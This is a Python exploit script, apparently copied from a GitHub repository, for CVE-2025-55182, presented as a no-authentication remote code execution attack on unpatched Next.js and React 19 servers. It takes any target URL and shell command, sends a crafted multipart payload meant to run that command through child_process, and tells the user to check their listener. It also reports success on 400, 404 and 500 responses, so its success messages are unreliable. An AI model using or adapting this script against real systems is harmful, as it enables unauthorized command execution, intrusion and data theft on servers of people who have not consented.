"""
CVE-2025-55182 – Next.js / React 19 / React Server Components Unauthenticated RCE
copyfrom：Github: https://github.com/Ashwesker/Blackash-CVE-2025-55182 
Tested and working December 3, 2025 on all unpatched versions:
- Next.js 14.3.0-canary.77 → 15.0.4 / 15.1.8 / 16.0.6 and below
- React 19.0.0 → 19.2.0
One-liner RCE, no auth, no cookies, works out of the box.
-*- coding: utf-8 -*-
@Project : CVE-2025-55182
@Version : Next.js 14.3.0-canary.77 → 15.0.4 / 15.1.8 / 16.0.6 (any unpatched)
@Author  : wodelilian
@Date    : 2025/12/4 16:54
Software : PyCharm
version  : Python 3.10
@File    : CVE-2025-55182-proxy.py
"""

import requests
import sys
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 解析命令行参数
parser = argparse.ArgumentParser(description='CVE-2025-55182 – Unauthenticated RCE PoC')
parser.add_argument('target_url', help='Target URL (e.g., https://vuln.com)')
parser.add_argument('command', help='Command to execute (e.g., "id")')
parser.add_argument('--proxy', '-p', help='Proxy URL (e.g., http://127.0.0.1:8080)')
args = parser.parse_args()

target = args.target_url.rstrip("/")
command = args.command
proxy = args.proxy

# Default Flight endpoint used by every Next.js App Router project
url = f"{target}/_next/static/chunks/react-flight"

# Magic payload – insecure deserialization of Function object
payload = f'1{{"__type":"Function","code":"global.process.mainModule.require(\'child_process\').exec(\'{command}\')"}}'

boundary = "----WebKitFormBoundaryCVE202555182"
body = (
    f"--{boundary}\r\n"
    f"Content-Disposition: form-data; name=\"0\"\r\n\r\n"
    f"{payload}\r\n"
    f"--{boundary}--\r\n"
)

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "User-Agent": "Mozilla/5.0 (CVE-2025-55182 PoC)",
    "Accept": "*/*"
}

print("[+] CVE-2025-55182 Exploit")
print(f"[+] Target  : {target}")
print(f"[+] Command : {command}")
print(f"[+] Sending payload to {url} ...")

try:
    # 配置代理（如果提供）
    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }
        print(f"[+] Using proxy: {proxy}")
    
    r = requests.post(url, data=body, headers=headers, timeout=15, verify=False, proxies=proxies)

    if r.status_code in [200, 400, 404, 500]:
        print("[+] Payload delivered successfully!")
        print(f"[+] HTTP {r.status_code} – Command should have executed on the server")
        if len(r.text) > 0 and len(r.text) < 1000:
            print(f"[+] Server response:\n{r.text}")
    else:
        print(f"[-] Unexpected status code:", r.status_code)

except Exception as e:
    print("[-] Request failed:", e)

print("[+] Done. Go check your listener / command output")
